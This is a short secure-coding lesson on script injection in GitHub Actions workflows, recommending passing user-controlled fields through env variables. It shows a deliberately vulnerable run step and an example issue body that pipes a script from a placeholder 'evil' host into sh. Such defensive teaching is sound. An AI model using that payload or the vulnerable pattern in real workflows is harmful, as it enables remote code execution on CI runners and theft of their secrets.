---
{
  "title": "GitHub Actions Script Injection — Use env Variables Instead of Inline Interpolation",
  "domain": "security",
  "lang": "en",
  "source": "codewhale",
  "status": "published",
  "tags": [
    "github-actions",
    "security",
    "code-injection",
    "codeql",
    "ci"
  ],
  "created": "2026-06-10 00:00:00 UTC",
  "updated": "2026-06-10 00:00:00 UTC",
  "domain_expert": "codewhale",
  "verified_date": "2026-06-10"
}
---

# GitHub Actions Script Injection — Use env Variables Instead of Inline Interpolation

> Translated from: [lessons/core/github-actions-code-injection.md](../core/github-actions-code-injection.md)

## Root Cause

When GitHub Actions `run:` scripts directly interpolate user-controlled context variables like `${{ github.event.issue.body }}` or `${{ github.event.pull_request.title }}`, attackers can inject arbitrary commands by crafting issue/PR content containing shell metacharacters (e.g., `` ` ``, `$(...)`, `;`).

```yaml
# VULNERABLE: inline interpolation
- run: |
    BODY="${{ github.event.issue.body }}"
    echo "$BODY" | grep "keyword"
```

If the issue body is `"$(curl http://evil/payload.sh | sh)"`, after expansion it becomes:
```bash
BODY="$(curl http://evil/payload.sh | sh)"
```

## Solution

Pass user-controlled context variables through `env:` instead of inlining them in `run:` scripts:

```yaml
# SAFE: pass via env variable
- run: |
    echo "$ISSUE_BODY" | grep "keyword"
  env:
    ISSUE_BODY: ${{ github.event.issue.body }}
```

GitHub Actions evaluates `${{ }}` expressions in `env:` blocks and writes the result as an environment variable value. The shell does not perform secondary parsing on special characters within the value.

## Prevention Checklist

- [ ] Never use `${{ }}` directly inside `run:` for user-controlled fields
- [ ] Use CodeQL or `actionlint` to detect script injection patterns
- [ ] Apply the principle: **interpolate in `env:`, reference in `run:`**
- [ ] Affected contexts: `issue.title`, `issue.body`, `pull_request.title`, `pull_request.body`, `comment.body`, `review.body`, `head_ref`

## References

- [GitHub Docs: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [CodeQL: Script injection in GitHub Actions](https://codeql.github.com/)
